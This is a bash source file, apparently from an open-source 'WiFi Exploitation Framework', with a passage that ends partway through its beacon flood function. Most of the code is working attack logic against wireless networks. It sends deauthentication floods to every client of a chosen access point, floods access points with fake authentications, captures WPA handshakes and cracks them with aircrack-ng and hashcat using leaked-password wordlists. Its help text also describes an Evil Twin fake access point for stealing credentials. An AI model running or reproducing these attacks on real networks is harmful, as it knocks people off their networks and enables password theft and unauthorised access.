#!/bin/bash

#--------------------------------
#
# The Swiss Army Knife for 802.11 Exploitation, WiFi Phishing and Bluetooth Hacking (WIP)
#
# By D3Ext and megazar (WiFi Exploitation Framework)
# Twitter: @d3ext and @megazar21
# Website: https://d3ext.github.io/
# Mail: <d3ext@proton.me>
# Github(s): https://github.com/D3Ext and https://github.com/ultrazar
#
# I'm not responsible of any bad usage of this tool
#
#--------------------------------

# Colors and formats
greenC="\e[0;32m\033[1m"
endC="\033[0m\e[0m"
rC="\e[0;31m\033[1m"
blueC="\e[0;34m\033[1m"
yC="\e[0;33m\033[1m"
grayC="\e[0;37m\033[1m"
underline="\033[4m"

export DEBIAN_FRONTEND=noninteractive

# Ctrl + C
function ctrl_c(){
  color_output_ln "!" "Exiting...\n"
  if [ "$(check_interface_mode)" == "monitor" ]; then
    killall aireplay-ng airodump-ng 2>/dev/null
    card_stop
  fi

  wpa_process=$(pidof wpa_supplicant)
  net_process=$(pidof NetworkManager)
  if [ ! "$wpa_process" ]; then
    color_output "*" "Restarting connections"
    systemctl restart wpa_supplicant 2>/dev/null
    if [ ! "$net_process" ]; then
      systemctl restart NetworkManager 2>/dev/null
    fi
  fi
  # Remove possible created during the attacks
  rm ${dir}/*.tmp \
    ${dir}/rainbowtables \
    ${dir}/wef-wordlist.txt \
    ${dir}/pmkid_hashes \
    ${dir}/pmkid_capture \
    ${dir}/scan_output 2>/dev/null
  
  #tput cnorm;
  exit 0
}

# Ctrl + C for the EvilTwin attack
function evil_c(){
  echo; color_output_ln "!" "Removing files..."
  # Kill created processes
  killall hostapd dnsmasq php &>/dev/null
  # Kill the http server
  fuser -k 80/tcp &>/dev/null
  # Reconfigure the network adapter
  ifconfig ${evilCard} down 2>/dev/null
  # Return to the directory
  popd &>/dev/null
  color_output_ln "!" "Stoping hostapd and dnsmasq..."; sleep 0.2

  iwconfig ${evilCard} mode managed 2>/dev/null; sleep 0.2
  ifconfig ${evilCard} up 2>/dev/null; sleep 0.1
  airmon-ng start ${evilCard} &>/dev/null
  back="1"
}

# Ctrl + C for inhibition function
function inhibition_c(){
  sleep 0.1
  # Kill deauth process
  killall aireplay-ng 2>/dev/null
  sleep 0.1
}

# Help Panel function
function helpPanel(){
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  "
  echo -e "\n${blueC}[${yC}WEF${blueC}] Wi-Fi Exploitation Framework ${yC}${program_version}${endC}"

  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)
  echo -e "\n${blueC}Required parameters:"
  echo -e "\t${yC}-i, --interface)${blueC} \tThe name of your interface in managed mode"
  echo -e "\nOptional parameters:"
  echo -e "\t${yC}-v, --verbose)${blueC} \t\tShow more info during the attacks"
  echo -e "\t${yC}-h, --help)${blueC} \t\tShows this help panel"
  echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}\n"
  exit 0
}

# First banner function
function banner1(){
  echo -e "${yC} █     █░▓█████   █████▒"
  echo -e "▓█░ █ ░█░▓█   ▀ ▓██   ▒ "
  echo -e "▒█░ █ ░█ ▒███   ▒████ ░     ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
  echo -e "░█░ █ ░█ ▒▓█  ▄ ░▓█▒  ░ "
  echo -e "░░██▒██▓ ░▒████▒░▒█░    "
  echo -e "░ ▓░▒ ▒  ░░ ▒░ ░ ▒ ░    "
  echo -e "  ▒ ░ ░   ░ ░  ░ ░      "
  echo -e "  ░   ░     ░    ░ ░    "
  echo -e "    ░       ░  ░        "
  echo -e "${endC}"
}

# Second banner dunction
function banner2(){
  echo -e "${yC} █████   ███   █████ ██████████ ███████████"
  echo -e "░░███   ░███  ░░███ ░░███░░░░░█░░███░░░░░░█"
  echo -e " ░███   ░███   ░███  ░███  █ ░  ░███   █ ░ "
  echo -e " ░███   ░███   ░███  ░██████    ░███████         ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
  echo -e " ░░███  █████  ███   ░███░░█    ░███░░░█   "
  echo -e "  ░░░█████░█████░    ░███ ░   █ ░███  ░    "
  echo -e "    ░░███ ░░███      ██████████ █████      "
  echo -e "     ░░░   ░░░      ░░░░░░░░░░ ░░░░░       "
  echo -e "${endC}"
}

# Third banner function
function banner3(){
  echo -e "${yC}██╗    ██╗███████╗███████╗"
  echo -e "██║    ██║██╔════╝██╔════╝               "
  echo -e "██║ █╗ ██║█████╗  █████╗                 "
  echo -e "██║███╗██║██╔══╝  ██╔══╝       ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
  echo -e "╚███╔███╔╝███████╗██║                    "
  echo -e " ╚══╝╚══╝ ╚══════╝╚═╝     "
  echo -e "${endC}   "
}

# Banner4 Function
function banner4(){
  echo -e "${yC} _______  __   __  ___   ___        _______  _     _  ___   __    _ "
  echo -e "|       ||  | |  ||   | |   |      |       || | _ | ||   | |  |  | |"
  echo -e "|    ___||  |_|  ||   | |   |      |_     _|| || || ||   | |   |_| |"
  echo -e "|   |___ |       ||   | |   |        |   |  |       ||   | |       |"
  echo -e "|    ___||       ||   | |   |___     |   |  |       ||   | |  _    |"
  echo -e "|   |___  |     | |   | |       |    |   |  |   _   ||   | | | |   |"
  echo -e "|_______|  |___|  |___| |_______|    |___|  |__| |__||___| |_|  |__|${endC}"
}

# Banner Randomizer
function all_banners(){
  # Get random number between 1 and 3 to display a random banner
  random_number=$(($RANDOM % 3 + 1))

  if [ "$random_number" == "1" ]; then
    banner1
  elif [ "$random_number" == "2" ]; then
    banner2
  elif [ "$random_number" == "3" ]; then
    banner3
  fi
}

# Auxiliar function to check if a dir exists and create it
function check_and_create(){
  if [ ! -d "${1}" ]; then
    mkdir "${1}" 2>/dev/null
  fi
}

function log_monitor_is_disabled(){ # This function is used when user selects an attack and monitor mode isn't enabled
  color_output_ln "*" "Your card is not in monitor mode."
  echo -e "${blueC}[${yC}*${blueC}] Please before doing any attack press the ${yC}Start network card${blueC} option${endC}"
}

function list_interfaces(){
  interfaces_out=$(ifconfig | grep ": flags=" | awk '{print $1}' FS=":" | grep -v "lo")

  color_output_ln "*" "Interfaces:"
  while IFS= read -r line; do
    echo -e "\t${grayC}${line}${endC}"
  done <<< "${interfaces_out}"
}

function reset_info(){ # This function sets some important variables, which are used during attacks, to "" (empty) to avoid errors and more
  channel=""
  name=""
  attack_time=""
}

#
# Beggining of the logging functions
#

function color_output_ln(){
  echo -e "\n${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output(){
  echo -e "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output_no_line(){
  echo -ne "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function good_output_ln(){
  echo -e "\n${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
}

function good_output(){
  echo -e "${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
}

function progress_bar(){
  echo -ne "${blueC}[${yC}${3}${blueC}] ${4}"
  for ((i = 0; i <= ${1}; i++)); do
    echo -ne "."
    sleep ${2}
  done

  echo -e "${endC}"
}

#
# End of the logging auxiliary functions
#

# Dependencies Function
function dependencies(){
  # Programs array
  programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm wget dnsmasq hostapd php crackle pixiewps)
  system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
  if [ "${system}"  == "Parrot" ] || [ "${system}"  == "Kali" ] || [ "${system}"  == "Ubuntu" ]; then
    for program in "${programs[@]}"; do
      which $program &>/dev/null
      if [ "$(echo $?)" == "1" ]; then
        color_output_ln "*" "Requirements not installed"
        color_output "*" "Installing ${program}..."
        apt install "${program}" -y &>/dev/null
      fi
    done

  elif [ "${system}"  == "Arch" ] || [ "$(echo \"${system}\" | grep -i \"arch\")" ]; then
    for program in "${programs[@]}"; do
      which $program &>/dev/null
      if [ "$(echo $?)" == "1" ]; then
        color_output_ln "*" "Requirements not installed"
        color_output "*" "Installing ${program}..."
        pacman -S "${program}" --noconfirm &>/dev/null
      fi
    done
  fi
}

# Functions Info
function functions_info(){
  # Print info about the different attacks and functions
  color_output_ln "WEF" "Tested with an ${yC}Alfa AWUS036ACM${blueC} adapter"; sleep 0.1
  color_output_ln "1" "Beacon Flood Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It creates a lot of fake APs to produce a DoS and kick the devices connected to the APs in the given channel [${yC}WPA${blueC}/${yC}WEP${blueC}]"; sleep 0.1
  color_output_ln "2" "Deauthentication Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "In this attack you send specific deauthentication packets to an AP to tell the router that a device is not connected and kicking it [${endC}${yC}WPA${endC}${blueC}]"; sleep 0.1
  color_output_ln "3" "Authentication Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It's an attack in which you inject a lot of fake users to an Access Point [${yC}WEP${blueC}]"; sleep 0.1
  color_output_ln "4" "PMKID Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It's an special attack, because it doesn't require clients connected to an Access Point [${yC}WPA${blueC}]"; sleep 0.1
  color_output_ln "5" "Passive/Stealthy Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "This attack keeps looking for handshakes when someone connects to the AP [${yC}WPA${blueC}/${yC}WEP${blueC}]"; sleep 0.1
  color_output_ln "6" "MAC Randomization:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "This function set a new random and fake mac address for your interface"; sleep 0.1
  color_output_ln "7" "Start network card:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "This feature starts your network adapter in monitor mode for injecting packages"; sleep 0.1
  color_output_ln "8" "Evil Twin Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It deploys a public and fake AP to steal credentials from clients with a lot of templates"; sleep 0.1
  color_output_ln "9" "Attacks info:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It displays this help panel about the availables functions"; sleep 0.1
  color_output_ln "10" "Pixie Dust Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "This attack try to exploit the WPS method [${yC}WPA${blueC}]"; sleep 0.1
  color_output_ln "11" "Caffe Latte Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It fakes the target AP to obtain the password in clear text [${yC}WEP${blueC}]"; sleep 0.1
  color_output_ln "12" "Chopchop Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "This attack send a fake and specific packet to decrypt the password in plain text [${yC}WEP${blueC}]"; sleep 0.1
  color_output_ln "13" "Michael Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "It exploits the TKIP encryption and cancels the connection of an AP (in rare cases it shutdowns the router) [${yC}WPA${blueC}/${yC}WEP${blueC}]"; sleep 0.1
  color_output_ln "14" "Replay Attack:"; sleep 0.1; echo -ne "\t"
  color_output_no_line "*" "This attack is performed installing an all-zero encryption key in the target to decrypt the data [${endC}${yC}WEP${endC}${blueC}]\n"; sleep 0.1
  sleep 0.1
}

# Exit Function
function keep_exit(){
  echo -e "\n"
  while true; do
    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status

    # If input is y or yes exit from the function
    if [ "${exit_status}" == "y" ] || [ "${exit_status}" == "yes" ]; then
      if [ "$module" == "wifi" ]; then
        ctrl_c
      #elif [ "$module" == "bluetooth" ]; then
        #blue_c
      fi

    # If input is "n" or "no" break the loop and return to the main function
    elif [ "${exit_status}" == "n" ] || [ "${exit_status}" == "no" ]; then
      break
    elif [ "${exit_status}" != "y" ] && [ "${exit_status}" != "n" ]; then
      color_output_ln "X" "Unknown option"
      keep_exit
    fi
  done
}

# Chipsets for monitor mode
function chipsets_panel(){
  # Print some of the chipsets that support monitor mode
  echo -e "\n\t${yC}Chipsets"
  echo -e "\t--------${blueC}"
  echo -e " \tRTL8812AU"
  echo -e " \tAR9271"
  echo -e " \tMT7610U"
  echo -e " \tMT7612U"
  echo -e " \tRTL8814U"
  echo -e " \tRTL8188EUS${endC}"
}

# Check the interface mode
function check_interface_mode(){
  # Function implemented by ultrazar
  # Workaround for arch linux
  if [ "$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')" == "Arch" ]; then
    iwconfig ${netCard} 2>/dev/null | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/' 2>/dev/null
  else
    iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'
  fi
}

# Active Card
function active_card(){
  status_card=$(check_interface_mode)
  # Check if the network adapter is in monitor mode or not
  if [ "${status_card}" == "monitor" ]; then
    good_output_ln "+" "Network card mode: ${greenC}\t\tMonitor"
  else
    good_output_ln "+" "Network card mode: ${grayC}\t\tManaged"
  fi
}

# MAC Address Status Function
function mac_status(){
  # Function enters here if it's called at the start of the program
  if [ "$time_counter" == "0" ]; then
    # Check if network interface is active and exists
    if [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ]; then
      actual_mac=$(ifconfig | grep "$netCard" -A 3 | grep "ether" | awk '{print $2}')
      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t${actual_mac}${endC}"
    else
      color_output "X" "MAC address not found\n"
      ctrl_c
    fi
  # Function enters here if the function isn't called at the start of the program
  elif [ "$start_counter" == "1" ]; then
    if [ "$(check_interface_mode)" == "monitor" ]; then
      actual_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}')
      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${greenC}\t\t${actual_mac}${endC}"
    else
      echo -e ${netCard}
      color_output "X" "MAC address not found\n"
      ctrl_c
    fi
    # Function enters here if you haven't started the network adapter yet
  elif [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ]; then
    actual_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}')
    echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t$actual_mac${endC}"
    # Print an error if the network interface doesn't exists
  else
    echo -e "${blueC}[${rC}X${blueC}] MAC address not found${endC}\n"
    ctrl_c
  fi
}

# MAC Address Changer
function mac_randomizer(){
  # Turn off the interface
  ifconfig ${netCard} down
  # Randomize the mac address
  macchanger -a ${netCard} &>/dev/null
  good_output_ln "+" "MAC address randomized successfully"
  # Activate again the interface
  ifconfig ${netCard} up
}

# Network Card Status
function card_status(){
  if [ "${start_counter}" == "1" ] ; then
    if [ -d "/sys/class/net/${netCard}" ]; then
      echo -e "${blueC}[${greenC}+${blueC}] Network interface: ${greenC}\t\t${netCard}${endC}"
    else
      echo -e "${blueC}[${rC}X${blueC}] Network interface not found${endC}"
    fi
  else
    if [ -d "/sys/class/net/${netCard}" ]; then
      echo -e "${blueC}[${greenC}+${blueC}] Network interface: ${grayC}\t\t${netCard}${endC}"
    else
      echo -e "${blueC}[${rC}X${blueC}] Network interface not found${endC}"
    fi
  fi
}

# Network Card Start
function card_setup(){
  # Function enters here if you've used the "Active Card" option
  if [ "$start_counter" != "1" ]; then
    card_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
    # Check if the value is the same as the interface to avoid errors in the else
    if [ "${card_check}" == "${netCard}" ]; then
      color_output_ln "*" "Configuring network card..."
      kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)

      if [ "${kill_network_services}" == "" ]; then
        echo -ne "\n${blueC}[${yC}*${blueC}] Are you sure to execute \"airmon-ng check kill\"? This will stop your active network connections! [${endC}${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read kill_network_services
        if [ "$kill_network_services" == "y" ]; then
          echo "airmon_check_kill=true" >> /opt/wef/wef.cnf
          kill_network_services="true"
        else
          echo "airmon_check_kill=false" >> /opt/wef/wef.cnf
          kill_network_services="false"
        fi
				
        echo -e "\n${blueC}[${yC}*${blueC}] airmon_check_kill set to ${kill_network_services}. You can change this later in /opt/wef/wef.cnf${endC}"; sleep 1.2;
      fi

      if [ "${kill_network_services}" == "true" ]; then
        airmon-ng check kill &>/dev/null
      fi

      good_output "+" "Network card configured successfully"
      # Enable monitor mode
      airmon-ng start ${netCard} &>/dev/null
      correct_counter="2"

      # Workaround for some weird interfaces which change its name radically
      if [ ! -d "/sys/class/net/${netCard}" ] && [ ! -d "/sys/class/net/${netCard}mon" ]; then
        ask_new_name
      # Check if your interface name changes when starting in monitor mode adding "mon" to its name  
      elif [ "$(iwconfig ${netCard}mon | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=':')" == "Monitor" ]; then
        evilCard="${netCard}"
        netCard="${netCard}mon"
        start_counter="1"
      # Enter here if the name doesn't change when starting in monitor mode
      elif [ "$(check_interface_mode)" == "monitor" ]; then
        evilCard="${netCard}"
        start_counter="1"
      fi
      sleep 1
    fi
  fi
}

# Network Card Stop
function card_stop(){
  airmon-ng stop ${netCard} &>/dev/null
  ifconfig ${netCard} up &>/dev/null
  good_output "+" "Monitor mode stoped\n"
}

# Ask for channel and ESSID
function ask_data1(){
  echo -ne "\n${blueC}[${yC}*${blueC}] Target AP name: ${endC}" && read name
  echo -ne "${blueC}[${yC}*${blueC}] AP channel: ${endC}" && read channel
}

# Ask for channel
function ask_data2(){
  color_output_no_line "*" "Target AP name: " && read name
  if [ "${name}" == "exit" ] || [ "${name}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for target BSSID
function ask_mac(){
  color_output_no_line "*" "BSSID address of the AP: " && read ap_mac
  if [ "${ap_mac}" == "exit" ] || [ "${ap_mac}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for client MAC
function ask_mac2(){
  color_output_no_line "*" "Client MAC address: " && read client_mac
  if [ "${client_mac}" == "exit" ] || [ "${client_mac}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for attack duration
function ask_time(){
  echo; color_output_no_line "*" "Attack duration (default=${default}): " && read attack_time
  if [ "${attack_time}" == "exit" ] || [ "${attack_time}" == "quit" ]; then
    ctrl_c
  fi
}

function ask_new_name(){ # Ask user for new interface name if it has changed
  echo -ne "\n${blueC}[${yC}*${blueC}] Interface name has changed, how is it called now?: ${endC}" && read new_name
  
  if [ ! -d "/sys/class/net/${new_name}" ]; then
    color_output_ln "X" "Especified interface doesn't exist!"
    ask_new_name
  fi

  evilCard=${netCard}
  netCard=${new_name}
  start_counter="1"
}

function check_ap_list(){
  if [ ! -f "scan_output" ]; then # Check if an AP scan already exists
    color_output_ln "*" "Scanning networks...\n"
    timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
  else # If it exists read content
    color_output_ln "*" "Acess points list:\n"
    cat scan_output
  fi
}

# AP Scan
function ap_scan(){
  echo; timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
  sleep 0.2
  good_output_ln "+" "Scan completed"
}

# Wordlist Function
function ask_dict(){
  color_output_ln "+" "Wordlists availables:"
  echo -e "${blueC}If you want to use a custom dictionary enter its name or path${endC}\n"
  echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
  echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
  echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
  color_output_no_line "WEF" "Select a wordlist to use: " && read dic_option

  if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
    wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"

  elif [ "$dic_option" == "2" ] || [ "$dic_option" == "probable" ] || [ "$dic_option" == "probable-v2-wpa-top4800.txt" ]; then
    wordlist_to_use="/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt"

  elif [ "$dic_option" == "3" ] || [ "$dic_option" == "darkweb" ] || [ "$dic_option" == "darkweb2017-top10000.txt" ]; then
    wordlist_to_use="/opt/wef/main/wordlists/darkweb2017-top10000.txt"

  elif [ -f "${dic_option}" ]; then
    wordlist_to_use="${dic_option}"

  else
    echo -e "${blueC}Especified wordlist file doesn't exist! Selecting rockyou.txt by default${endC}"
    wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"

  fi
}

# Handshake Cracking
function handshake_crack(){
  if [ -f "/opt/wef/main/captures/${name}/Capture-01.cap" ]; then
    sleep 0.4; ask_dict; sleep 0.4; echo
    aircrack-ng -w ${wordlist_to_use} "/opt/wef/main/captures/${name}/Capture-01.cap"; sleep 0.3
    good_output "+" "Cracking process completed"; sleep 1
    reset_info
    keep_exit
  else
    color_output_ln "X" "Handshakes file not found\n"
    exit 0
  fi
}

# Report Generator Function
function report-gen(){
  if [ ! -f "/opt/wef/main/logs/${name}.log" ]; then
    touch "/opt/wef/main/logs/${name}.log" 2>/dev/null
  fi

  if [ ! "${name}" ]; then
    name="Not especified"
  fi

  if [ ! "${channel}" ]; then
    channel="Not especified"
  fi

  if [ ! "${attack_time}" ]; then
    attack_time="Not especified"
  fi

  # Log file format
  echo -e "[WEF] WiFi Exploitation Framework
---------------------------------
Date of the attack: ${actual_date}
Type of attack: ${type_of_attack}
Target Access Point: ${name}
Duration of the attack: ${attack_time}
Channel of the AP: ${channel}
---------------------------------\n" >> "/opt/wef/main/logs/${name}.log" 2>/dev/null
}

# Deauth all clients
function deauth_all_clients(){
  sleep 0.3
  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to capture handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read catch_handshakes

  # Check user input to start airodump or not
  if [ "${catch_handshakes}" == "y" ] || [ "${catch_handshakes}" == "yes" ]; then
    xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null &
    air2_PID=$!
  fi

  echo
  color_output_no_line "*" "Packets to send (default=10): " && read packets_to_send

  if [ ! "$packets_to_send" ]; then
    packets_to_send="10"
  fi

  progress_bar 2 0.2 "*" "Starting Deauthentication attack"

  iwconfig ${netCard} channel ${channel}
  if [ "$verbose" == "0" ]; then
    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
  elif [ "$verbose" == "1" ]; then
    echo
    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null
  fi

  if [ "${catch_handshakes}" == "y" ] || [ "${catch_handshakes}" == "yes" ]; then
    progress_bar 4 2 "*" "Waiting while clients reconect to capture handshakes"
    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
  fi

  check_and_create "/opt/wef/main/captures/${name}"
  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null; sleep 0.2
  good_output_ln "+" "Attack completed"; sleep 0.1
  report-gen
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3
	
  if [ "${catch_handshakes}" == "y" ] || [ "${catch_handshakes}" == "yes" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read cracking_option
  fi

  sleep 0.1; if [ "${cracking_option}" == "y" ] || [ "${cracking_option}" == "yes" ]; then
    handshake_crack
  else
    reset_info; keep_exit
  fi
}

# Deauth one client
function deauth_one_client(){
  sleep 0.3
  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to capture handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read catch_handshakes

  xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null &
  air2_PID=$!

  ask_mac2

  if [ "${catch_handshakes}" == "n" ] || [ "${catch_handshakes}" == "no" ]; then
    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
  fi

  sleep 0.1; echo
  color_output_no_line "*" "Packets to send (default=10): " && read packets_to_send; sleep 0.3

  if [ "$packets_to_send" == "" ]; then
    packets_to_send="10"
  fi

  progress_bar 2 0.2 "*" "Starting Deauthentication attack"

  if [ "$verbose" == "0" ]; then
    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} &>/dev/null
  elif [ "$verbose" == "1" ]; then
    echo
    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} 2>/dev/null
  fi

  if [ "$catch_handshakes" == "y" ] || [ "$catch_handshakes" == "yes" ]; then
    progress_bar 4 2 "*" "Waiting while client reconect to capture its handshake"
    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
  fi

  check_and_create "/opt/wef/main/captures/${name}/"
  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null; sleep 0.3
  good_output_ln "+" "Attack completed"; sleep 0.1
  report-gen
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"; sleep 0.3

  if [ "$catch_handshakes" == "y" ] || [ "$catch_handshakes" == "yes" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
  fi

  sleep 0.1; if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
    handshake_crack
  else
    reset_info; keep_exit
  fi
}

# Deauthentication Function
function deauth_attack(){
  clear; banner1; sleep 0.3

  color_output_ln "1" "Deauthenticate all clients"
  color_output "2" "Deauthenticate one client\n"; sleep 0.1

  color_output_no_line "WEF" "Choose an option > " && read deauth_option
  if [ "${deauth_option}" != "1" ] && [ "${deauth_option}" != "2" ]; then
    color_output_ln "X" "Unknown option!"; sleep 1
    deauth_attack
  fi

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  if [ "${deauth_option}" == "1" ] || [ "${deauth_option}" == "all" ]; then
    deauth_all_clients
  elif [ "${deauth_option}" == "2" ] || [ "${deauth_option}" == "one" ]; then
    deauth_one_client
  fi
}

# PMKID Cracking
function pmkid_crack(){
  file_to_crack="/opt/wef/main/captures/${name}/pmkid_hash"

  if [ -f "${file_to_crack}" ] && [ "$(wc -l "${file_to_crack}")" != "0" ]; then
    sleep 0.3; ask_dict; sleep 0.3; echo

    hashcat -m 22000 "${file_to_crack}" "${wordlist_to_use}" -d 1 ; sleep 0.3
    good_output_ln "+" "Cracking process completed"; sleep 1
    reset_info
    keep_exit
  else
    color_output_ln "X" "Handshakes not captured or not found"
    keep_exit
  fi
}

# Inhibitor Function
function inhibitor(){
  sleep 0.1; trap inhibition_c INT # Change Ctrl + C keyboard interrupt function

  progress_bar 2 0.4 "*" "Getting AP channel"

  if [ -f "scan_output" ]; then
    channel_to_inhibit=$(cat scan_output | grep -i "${ap_to_inhibit}$" | head -n 1 | awk '{print $2}')
  else
    channel_to_inhibit=$(timeout 28 bash -c "wash -2 -5 -s -a -i ${netCard}" | grep -i "${ap_to_inhibit}$" | head -n 1 | awk '{print $2}')
  fi

  iwconfig ${netCard} channel ${channel_to_inhibit}
  progress_bar 2 0.4 "*" "Starting inhibition"
  color_output_ln "WEF" "Press Ctrl + C to stop attack"

  if [ "${verbose}" == "0" ]; then
    aireplay-ng -0 0 -e "${ap_to_inhibit}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
  elif [ "${verbose}" == "1" ]; then
    echo
    aireplay-ng -0 0 -e "${ap_to_inhibit}" -c FF:FF:FF:FF:FF:FF ${netCard}
    echo
  fi

  sleep 0.1
  good_output_ln "+" "Inhibition completed"; sleep 0.1
}

# Auth Attack
function auth_attack(){
  clear; banner2; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
  ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
  actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  check_and_create "/opt/wef/main/captures/${name}"

  echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to capture handshake(s)? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read handshake_option

  if [ "${handshake_option}" == "y" ] || [ "${handshake_option}" == "yes" ]; then
    xterm -hold -e "airodump-ng -c ${channel} -w ${dir}/Capture --essid \"${name}\" ${netCard}" 2>/dev/null &
    air2_PID=$!
  fi

  progress_bar 2 0.2 "*" "Starting Authentication attack"

  if [ "$verbose" == "0" ]; then
    mdk4 ${netCard} a -i ${ap_mac} &>/dev/null
  elif [ "$verbose" == "1" ]; then
    echo
    mdk4 ${netCard} a -i ${ap_mac} 2>/dev/null
  fi; sleep 0.1
  
  if [ "$handshake_option" == "y" ] || [ "$handshake_option" == "yes" ]; then
    progress_bar 4 2 "*" "Waiting while clients reconect to capture handshakes"
    kill -9 ${air2_PID}; wait ${air2_PID} 2>/dev/null
  fi; sleep 0.3

  good_output_ln "+" "Authentication Attack completed"; sleep 0.1
  color_output_ln "*" "Logs stored in: /opt/wef/main/logs/${name}.log"
  mv Capture-* "/opt/wef/main/captures/${name}/" 2>/dev/null

  report-gen; reset_info; sleep 1; keep_exit
}

# Beacon Attack
function beacon_flood(){
  clear; banner3; sleep 0.3

  check_ap_list # Show APs info or scan APs if it hasn't been done
  echo; ask_data2

  channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
